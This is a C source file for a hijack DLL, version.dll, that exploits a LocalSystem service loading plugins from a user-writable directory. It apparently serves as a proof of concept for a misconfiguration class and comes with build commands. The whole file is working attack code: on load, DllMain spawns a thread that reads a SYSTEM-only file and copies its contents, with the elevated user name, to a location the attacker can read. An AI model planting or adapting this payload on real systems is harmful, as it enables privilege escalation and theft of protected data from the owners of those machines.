/*
 * version.dll — payload for the "writable plugin directory" privilege
 * escalation pattern.
 *
 * A service running as LocalSystem loads a plugin from a directory that a
 * lower-privileged user can write to. Replacing the plugin with this DLL
 * yields code execution in the service's context (SYSTEM).
 *
 * This is NOT a CVE. It is a reproduction of a misconfiguration class:
 *   - privileged service  (service account = LocalSystem)
 *   - plugin loaded from a user-writable directory
 *   - no integrity/signature check on the plugin
 *
 * Build (architecture must match the host service):
 *   x86_64-w64-mingw32-gcc -shared -O2 -o version.dll dll.c
 *
 * Optional overrides:
 *   -DIN_FILE='"C:/path/only/SYSTEM/can/read"'
 *   -DOUT_FILE='"C:/path/the/attacker/can/read"'
 *
 * Paths use forward slashes on purpose: "C:\Users" is parsed as a \U
 * unicode escape by the compiler.
 */
#include <windows.h>

#ifndef IN_FILE
#define IN_FILE "C:/Users/Administrator/Desktop/proof.txt"
#endif

#ifndef OUT_FILE
#define OUT_FILE "C:/ProgramData/CorpUpdate/plugins/pwned.txt"
#endif

#define MAX_DATA 4096

static DWORD WINAPI payload(LPVOID arg) {
    (void)arg;
    char data[MAX_DATA] = {0};
    DWORD n = 0;

    /* Read a file that only the service account can access. */
    HANDLE hIn = CreateFileA(IN_FILE, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, 0, NULL);
    if (hIn != INVALID_HANDLE_VALUE) {
        ReadFile(hIn, data, sizeof(data) - 1, &n, NULL);
        CloseHandle(hIn);
    }

    /* Record the identity we are running as, to prove the escalation. */
    char user[256] = {0};
    DWORD u = sizeof(user);
    GetUserNameA(user, &u);

    /* Drop the result where the attacker can read it. */
    HANDLE hOut = CreateFileA(OUT_FILE, GENERIC_WRITE, 0, NULL,
                              CREATE_ALWAYS, 0, NULL);
    if (hOut != INVALID_HANDLE_VALUE) {
        DWORD w = 0;
        WriteFile(hOut, user, lstrlenA(user), &w, NULL);
        WriteFile(hOut, "\r\n", 2, &w, NULL);
        WriteFile(hOut, data, n, &w, NULL);
        CloseHandle(hOut);
    }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
    (void)hinst;
    (void)reserved;

    if (reason == DLL_PROCESS_ATTACH) {
        /* DllMain runs under the loader lock: never block here. */
        CreateThread(NULL, 0, payload, NULL, 0, NULL);
    }
    return TRUE;
}
